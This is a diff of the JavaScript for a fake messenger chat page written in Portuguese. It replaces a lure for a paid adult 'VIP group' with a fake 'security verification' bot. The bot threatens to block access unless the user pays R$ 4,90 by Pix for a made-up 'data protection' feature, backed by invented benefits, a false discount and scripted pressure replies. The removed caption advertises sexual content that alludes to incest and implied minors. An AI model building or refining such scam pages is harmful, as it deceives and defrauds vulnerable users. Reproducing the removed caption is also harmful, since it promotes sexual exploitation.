@@ -2,10 +2,29 @@
 
 const CONTACTS = [
   {
-    id: 1, name: 'Bruna Coutinho', initials: 'BC', color: '#4a9da8', avatar: 'imagens e videos/perfil.jpeg',
-    status: 'online', unread: 0,
+    id: 1,
+    name: 'Verificação de Segurança',
+    initials: '🛡️',
+    color: '#2CA5E0',
+    avatar: null,
+    status: 'sistema ativo',
+    unread: 0,
     messages: [
-      { id: 1, out: false, type: 'video', src: 'imagens e videos/2edc9c87-9a23-437b-9753-c3cd5dd7e1ed.mp4', duration: '0:15', caption: '🔥+𝟭𝟯𝟬 𝗺𝗶𝗹 𝘃𝗶𝗱𝗲𝗼𝘀 𝗲 𝗳𝗼𝘁𝗼𝘀\n🎁 𝗧𝗨𝗗𝗢 𝗣𝗢𝗥 𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗜𝗔𝗦:\n🔞 𝗚𝗼𝘀𝘁𝗼𝘀𝗮𝘀 𝗽𝗼𝗯𝗿𝗲𝘀 𝗲 𝘁𝗮𝗿𝗮𝗱𝗮𝘀 𝗾𝘂𝗲 𝗻𝗮𝗼 𝘁𝗲𝗺 𝗹𝗶𝗺𝗶𝘁𝗲\n🏠 𝗗𝗼𝗻𝗮 𝗱𝗲 𝗰𝗮𝘀𝗮 𝗾𝘂𝗲𝗿𝗲𝗻𝗱𝗼 𝗮𝘁𝗲𝗻çã𝗼\n👀 𝗔𝗾𝘂𝗲𝗹𝗮 𝘀𝘂𝗮 𝗣𝗥𝟭𝗠𝟰 𝗾𝘂𝗲 𝘁𝗲 𝗱𝗲𝗶𝘅𝗮 𝗱𝗲 𝗽𝗮𝘂 𝗱𝘂𝗿𝗼\n🇧🇷 𝗕𝗿𝗮𝘀𝗶𝗹𝗲𝗶𝗿𝗮𝘀 𝗱𝗮 𝗙𝗮𝘃𝗲𝗹𝗮 | 𝗡𝗼𝗶𝗮𝗱𝗶𝗻𝗵𝗮𝘀\n🤤 𝗚𝗼𝘀𝘁𝗼𝘀𝗮𝘀 𝗱𝗼 𝗯𝗮𝗿𝗿𝗮𝗰𝗼 𝗳𝗮𝘇𝗲𝗻𝗱𝗼 𝘁𝘂𝗱𝗼 𝗾𝘂𝗮𝗻𝗱𝗼 𝗮 𝗺𝗮𝗲 𝘁𝗮 𝗳𝗼𝗿𝗮\n🚫 𝗣#𝗻𝗵𝗲𝘁𝗮 𝗲 𝗯𝗼𝗾𝘁𝗲 𝗲𝗺 𝘃𝗶𝗲𝗹𝗮𝘀, 𝗰𝗼𝗻𝘀𝘁𝗿𝘂çã𝗼\n🤰𝗠𝗔𝗘 𝗱𝗲 𝗡𝟬𝗩𝟭𝗡𝗛𝟰 𝗱𝗮 𝗽𝗲𝗿𝗶𝗳𝗲𝗿𝗶𝗮 𝗾𝘂𝗲 𝗮𝗱𝗼𝗿𝗮 𝘀𝗲 𝗲𝘅𝗶𝗯𝗶𝗿\n☠️ 𝟭𝗻𝗰𝗲𝘀𝘁𝗼𝘀 𝗻𝗮 𝗙𝗮𝘃𝟯𝗹𝗮\n➕ E muito mais que nao pode\nescrever aqui ... 🤫🙈\nBonus vitalicio: 🔵 M 9.7T.B no link do Mega ❌🧰\n(sem senha de acesso)\n🤫 Sigilo total, GRUPO a prova de quedas. TODOS os conteúdos\nenviados são 100% REAIS ✅', time: '09:10' },
+      {
+        id: 1, out: false, type: 'alert',
+        title: 'Ação necessária antes de continuar',
+        body: 'Para acessar o grupo e seus conteúdos exclusivos, você precisa ativar a proteção dos seus dados agora.',
+        time: '09:10'
+      },
+      {
+        id: 2, out: false, type: 'richtext',
+        html: 'Este grupo utiliza um <strong>sistema de verificação de segurança obrigatório</strong>.<br><br>Antes de liberar seu acesso completo, você precisa ativar a proteção — isso garante que sua identidade e atividade dentro do grupo fiquem <span class="msg-highlight">100% privadas</span>.<br><br><strong>Sem a ativação, seu acesso será bloqueado automaticamente.</strong>',
+        time: '09:10'
+      },
+      {
+        id: 3, out: false, type: 'benefits',
+        time: '09:10'
+      },
     ]
   },
 ];
@@ -31,17 +50,11 @@ function now() {
   return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
 }
 
-function avatarStyle(contact) {
-  return `background:${contact.color}`;
-}
-
-
 // ─── Render messages ─────────────────────────────────────────────────────────
 
 function renderMessages(contact) {
   messagesArea.innerHTML = '';
 
-  // date divider
   const div = document.createElement('div');
   div.className = 'date-divider';
   div.innerHTML = '<span>Hoje</span>';
@@ -62,11 +75,52 @@ function renderBubble(msg, contact) {
         <svg viewBox="0 0 16 15"><path fill="currentColor" d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.88a.32.32 0 0 1-.484.033L6.891 8.267a.366.366 0 0 0-.516.005l-.423.433a.364.364 0 0 0 .006.514l3.258 3.185c.143.14.361.125.484-.033l6.272-8.048a.365.365 0 0 0-.062-.51z"/></svg>
       </span>` : '';
 
-  const senderLine = (!msg.out && msg.sender)
-    ? `<div style="font-size:13px;font-weight:600;color:${contact.color};margin-bottom:2px">${msg.sender}</div>`
-    : '';
-
-  if (msg.type === 'video') {
+  if (msg.type === 'alert') {
+    row.innerHTML = `
+      <div class="bubble bubble-alert">
+        <div class="alert-icon-wrap">⚠️</div>
+        <div class="alert-title">${escHtml(msg.title)}</div>
+        <div class="alert-body">${escHtml(msg.body)}</div>
+        <div class="bubble-footer">
+          <span class="bubble-time">${msg.time}</span>
+          ${checkMark}
+        </div>
+      </div>
+    `;
+  } else if (msg.type === 'richtext') {
+    row.innerHTML = `
+      <div class="bubble bubble-richtext">
+        <div class="bubble-html">${msg.html}</div>
+        <div class="bubble-footer">
+          <span class="bubble-time">${msg.time}</span>
+          ${checkMark}
+        </div>
+      </div>
+    `;
+  } else if (msg.type === 'benefits') {
+    row.innerHTML = `
+      <div class="bubble bubble-benefits">
+        <div class="benefits-header">🔒 O que está protegido</div>
+        <div class="benefits-list">
+          <div class="benefits-item"><span class="benefits-icon">👁️</span><span>Seu número fica oculto para outros membros do grupo</span></div>
+          <div class="benefits-item"><span class="benefits-icon">🔐</span><span>Suas mensagens não são rastreadas por terceiros</span></div>
+          <div class="benefits-item"><span class="benefits-icon">🚫</span><span>Seu perfil não aparece em buscas externas</span></div>
+          <div class="benefits-item"><span class="benefits-icon">⚡</span><span>Acesso liberado imediatamente após a ativação</span></div>
+          <div class="benefits-item"><span class="benefits-icon">♾️</span><span>Válido permanentemente — pagamento único, sem renovação</span></div>
+        </div>
+        <div class="benefits-price-section">
+          <span class="benefits-old-price">R$ 19,90</span>
+          <span class="benefits-new-price">R$ 4,90</span>
+        </div>
+        <div class="benefits-trust">✅ Taxa única &nbsp;&nbsp; sem mensalidade</div>
+        <button class="benefits-cta" onclick="document.getElementById('ctaBtn').click()">🔓 ATIVAR PROTEÇÃO E ENTRAR NO GRUPO — R$ 4,90</button>
+        <div class="bubble-footer">
+          <span class="bubble-time">${msg.time}</span>
+          ${checkMark}
+        </div>
+      </div>
+    `;
+  } else if (msg.type === 'video') {
     const captionHtml = msg.caption
       ? `<div class="video-caption">${escHtml(msg.caption).replace(/\n/g, '<br>')}</div>`
       : '';
@@ -93,7 +147,6 @@ function renderBubble(msg, contact) {
   } else {
     row.innerHTML = `
       <div class="bubble">
-        ${senderLine}
         ${escHtml(msg.text)}
         <div class="bubble-footer">
           <span class="bubble-time">${msg.time}</span>
@@ -128,7 +181,7 @@ function openChat(id) {
   activeId = id;
 
   topbarName.textContent = contact.name;
-  topbarStatus.textContent = contact.isTyping ? 'digitando...' : contact.status;
+  topbarStatus.textContent = contact.isTyping ? 'verificando...' : contact.status;
   if (contact.avatar) {
     topbarAvatar.innerHTML = `<img src="${contact.avatar}" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">`;
     topbarAvatar.style.background = 'none';
@@ -162,47 +215,40 @@ function sendMessage() {
   msgInput.value = '';
   msgInput.style.height = 'auto';
 
-  // Simulate reply after 1-2s
   const delay = 1000 + Math.random() * 1000;
   setTimeout(() => {
     const lowerText = text.toLowerCase();
     let replies;
     if (lowerText.match(/oi|olá|ola|oii|opa|ei|bom dia|boa tarde|boa noite|tudo|salve/)) {
       replies = [
-        'Oi amor! 😍 Que bom te ver aqui… você já entrou no meu grupo VIP? 🌸',
-        'Oii! 😘 Tô te esperando lá no grupo com tudo exclusivo pra você…',
-        'Oi bb! Entrou no grupinho ainda não? Tô postando coisa quente hoje 🔥',
+        '🔒 Olá! Para garantir sua privacidade, você precisa ativar a proteção dos seus dados.',
+        '⚠️ Seu acesso ainda não foi verificado. Ative a proteção para continuar com segurança.',
+        '🛡️ Olá! Para acessar o grupo com segurança, clique no botão abaixo.',
       ];
-    } else if (lowerText.match(/grupo|vip|entrar|acesso|assinar|comprar|pagar/)) {
+    } else if (lowerText.match(/grupo|entrar|acesso|assinar|comprar|pagar/)) {
       replies = [
-        'Clica no botão aqui embaixo e entra agora, tá? São só R$ 2,90 e você tem acesso a tudo 🌸🔥',
-        'No grupo tem +300 mídias exclusivas! É só R$ 2,90, bem baratinho 😏 Vem logo!',
-        'Amor, entra logo no VIP! Hoje mesmo postei coisa nova que você vai amar 😈',
+        '🔐 Para entrar no grupo, você precisa ativar a proteção dos seus dados. É rápido e custa apenas R$ 4,90.',
+        '⚡ Ative sua proteção agora e tenha acesso imediato ao grupo.',
+        '🛡️ Clique no botão abaixo para ativar a proteção e entrar no grupo.',
       ];
-    } else if (lowerText.match(/video|vídeo|foto|conteudo|conteúdo|mídia|midia/)) {
+    } else if (lowerText.match(/proteção|protecao|segurança|seguranca|privacidade|verificação|verificacao/)) {
       replies = [
-        'No grupo tem tudo: anal, vídeos com amigas, primas… mais de 300 mídias esperando por você 😈🌸',
-        'Tô postando todo dia coisa nova no VIP! Entra lá e confere 🔥',
-        'São +300 mídias exclusivas esperando por você no grupinho 😏 Não perde não!',
+        '🔒 A proteção mantém seu número oculto e suas mensagens privadas no grupo.',
+        '🛡️ Com a ativação, sua identidade fica 100% protegida dentro do grupo.',
+        '🔐 Sua privacidade é nossa prioridade. Ative agora por apenas R$ 4,90.',
       ];
     } else if (lowerText.match(/preço|preco|valor|quanto|caro|barato/)) {
       replies = [
-        'É só R$ 2,90 amor! Super baratinho pra ter acesso a tudo 🌸',
-        'Tá com 90% de desconto hoje! De R$ 29,90 por apenas R$ 2,90 😱 Aproveita!',
-        'R$ 2,90 e você entra no meu mundinho secreto… vale demais 😏',
-      ];
-    } else if (lowerText.match(/sorteio|prêmio|premio|ganhar|sortear/)) {
-      replies = [
-        'Todo dia faço sorteio no grupo! Quem sabe você não é o próximo a gravar comigo? 💖',
-        'Os sortudos do grupo participam das gravações comigo… entra logo! 😘',
-        'Hoje tem sorteio no grupo VIP! Você ainda não entrou? 🎉',
+        '💰 A taxa de ativação é R$ 4,90 — pagamento único, sem renovação!',
+        '✅ Apenas R$ 4,90 uma única vez para ter sua proteção permanente.',
+        'É só R$ 4,90 de taxa única. Sem mensalidade, sem surpresas!',
       ];
     } else {
       replies = [
-        'Amor, entra no meu grupo VIP e vem me conhecer de verdade 😏🌸',
-        'Te espero lá no grupinho! São só R$ 2,90 e tem tudo exclusivo pra você 🔥',
-        'Não deixa pra depois não, a oferta tá expirando! Entra logo 😘',
-        'Clica no botão e vem me ver lá dentro… você não vai se arrepender 💖',
+        '⚠️ Seu acesso será bloqueado automaticamente sem a ativação. Clique no botão abaixo.',
+        '🔒 Ative sua proteção de dados agora para liberar o acesso ao grupo.',
+        '🛡️ Para continuar com segurança, ative a proteção clicando no botão.',
+        '⚡ Não perca seu acesso! Ative a proteção por R$ 4,90 agora.',
       ];
     }
     const reply = {
@@ -210,7 +256,6 @@ function sendMessage() {
       out: false,
       text: replies[Math.floor(Math.random() * replies.length)],
       time: now(),
-      sender: contact.messages.find(m => !m.out && m.sender)?.sender,
     };
     contact.messages.push(reply);
     if (activeId === contact.id) {
@@ -219,7 +264,6 @@ function sendMessage() {
     }
   }, delay);
 
-  // Mark as read after brief delay
   setTimeout(() => {
     msg.read = true;
     const row = messagesArea.querySelector(`[data-msg-id="${msg.id}"]`);
@@ -245,7 +289,6 @@ msgInput.addEventListener('input', () => {
   msgInput.style.height = 'auto';
   msgInput.style.height = Math.min(msgInput.scrollHeight, 120) + 'px';
 });
-
 
 // ─── Utils ───────────────────────────────────────────────────────────────────
 
@@ -300,19 +343,19 @@ async function sendUtmifyOrder(orderId, status, approvedDate = null) {
     },
     products: [
       {
-        id:          'acesso-vip-7dias',
-        name:        'Acesso VIP 7 dias',
-        planId:      'acesso-vip-7dias',
-        planName:    'Acesso VIP 7 dias',
-        quantity:    1,
-        priceInCents: 290,
+        id:           'ativacao-protecao',
+        name:         'Ativação Proteção de Dados',
+        planId:       'ativacao-protecao',
+        planName:     'Ativação Proteção de Dados',
+        quantity:     1,
+        priceInCents: 490,
       },
     ],
     trackingParameters: utms,
     commission: {
-      totalPriceInCents:    290,
-      gatewayFeeInCents:    0,
-      userCommissionInCents: 290,
+      totalPriceInCents:     490,
+      gatewayFeeInCents:     0,
+      userCommissionInCents: 490,
     },
   };
   try {
@@ -333,7 +376,6 @@ const copyBtn     = document.getElementById('copyBtn');
 const copyLabel   = document.getElementById('copyLabel');
 const pixKey      = document.getElementById('pixKey');
 const qrImg       = document.querySelector('.qr-img');
-const qrWrap      = document.querySelector('.qr-wrap');
 
 let countdownSecs = 10 * 60;
 let countdownInterval = null;
@@ -376,7 +418,6 @@ function setQrError() {
 function showPaymentSuccess() {
   clearInterval(pollInterval);
   clearInterval(countdownInterval);
-  // Notifica Utmify: pagamento confirmado
   const approvedDate = new Date().toISOString().slice(0, 19).replace('T', ' ');
   sendUtmifyOrder(currentPixId, 'paid', approvedDate);
   const card = document.querySelector('.modal-card');
@@ -385,7 +426,7 @@ function showPaymentSuccess() {
       <div style="font-size:64px;margin-bottom:16px;">✅</div>
       <h2 style="color:#2ecc71;font-size:20px;font-weight:800;margin-bottom:8px;">Pagamento confirmado!</h2>
       <p style="color:var(--text-secondary);font-size:14px;line-height:1.6;">
-        Seu acesso foi liberado!<br>
+        Sua proteção foi ativada!<br>
         Redirecionando em <strong id="redirectCount" style="color:#2ecc71;">3</strong>s... 🚀
       </p>
     </div>`;
@@ -409,8 +450,8 @@ async function createPix() {
       method: 'POST',
       headers: { 'Authorization': `Bearer ${VENO_API_KEY}`, 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        amount: 290,
-        description: 'Acesso VIP 7 dias',
+        amount: 490,
+        description: 'Ativação Proteção de Dados',
         metadata: utms,
       })
     });
@@ -418,7 +459,6 @@ async function createPix() {
     const data = await res.json();
     currentPixId = data.id;
     setQrData(data.pix_copy_paste);
-    // Notifica Utmify: pagamento pendente
     sendUtmifyOrder(currentPixId, 'waiting_payment');
     startPolling();
   } catch (e) {
